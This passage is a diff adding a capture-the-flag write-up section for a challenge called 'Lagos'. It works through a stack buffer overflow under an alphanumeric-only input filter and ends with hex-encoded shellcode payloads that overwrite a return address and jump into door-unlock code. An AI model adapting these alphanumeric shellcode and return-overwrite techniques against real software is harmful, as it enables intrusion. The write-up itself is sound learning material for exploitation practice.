@@ -547,4 +547,90 @@ So combine shell code, NOPs, and the return code...
 
 ## Lagos
 
+This next challenge has some code that validates the input text is 0-9, a-z, or A-Z.  We are given
+0x200 of buffer to dump on the stack (once it passes validation).
+
+Just for reference:
+
+0x30 - 0x39 = Numbers
+0x41 - 0x5A = Uppercase
+0x61 - 0x7a = lowercase
+
+My shell code that I used on previous problem is mostly invalid, yeah...
+
+The stack pointer is at 0x43ed.  We can easily put out shell code in at 0x4430 though, and make the
+return start us there.
+
+What can we do?
+
+mov of constants to r0-r9.
+mov data between register r0-r9
+add small numbers to r0-r9? (strange, maybe it becomes shift?)
+decrement r0-r9
+addc.b
+mov.b	@r4, r7 # for any registers pretty much
+pop into r5-9
+ret
+add.b r5,r14
+some jump instructions, must experiment a lot in disassembler
+
+The return instruction is great if I can get the address I want on the stack somehow, but I did
+not come up with a reasonable way to do that.
+
+What if we increment the 0x7e in conditional_unlock_door() to a 0x7f, and somehow jump into it...
+
+The address of the 0x7e that we need to increment is at 0x445e.  We can generate a 0x445e by
+setting a register to 0x4461, and then decrementing it a bunch.
+
+Can I move the stack pointer to an address, and then pop it to load the value into a register.
+
+### The goal
+
+For Lagos, I found the minimum steps to open a door would be this:
+
+```
+r14=7f
+pc=4600
+```
+
+At first, I was overwriting the return address for the login command, jumping to a later part of
+the buffer that could be addressed alpha-numerically
+
+### Construct buffer
+
+This gets me to the return address
+
+```
+30313233343536373839414243444546
+```
+
+This will overwrite the return address properly:
+```
+30313233343536373839414243444546473044
+```
+
+3x16 bytes of shell garbage
+```
+303132333435363738394142434445463031323334353637383941424344454630313233343536373839414243444546
+```
+
+This gets 7f in r14
+```
+3031323334353637383941424344454647304430313233343536373839414243444546303132333435363738394142434445463031323334353637383941424344454679503636795049494e49
+```
+
+Testing some jump instructions
+
+3031323334353637383941424344454647304430313233343536373839414243444546303132333435363738394142434445463031323334353637383941424344454679503636795049494e494634
+
+I can only jump 0xee from the current PC.  I need a relative jump of about 0x1c6.  I can just
+overwrite more stack till I get closer?  Not sure but I'm about to clobber the current conditional
+check code.  So I just added a bunch of NOP crap with the shell code to get 0x7f into r14 and then
+jump as far ahead as I can.  Just tweak the number of NOPs until I can finally jump to the 0x4600
+code I'm trying to reach.
+
+```
+4476537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765379503636795049494e497634
+```
+
 
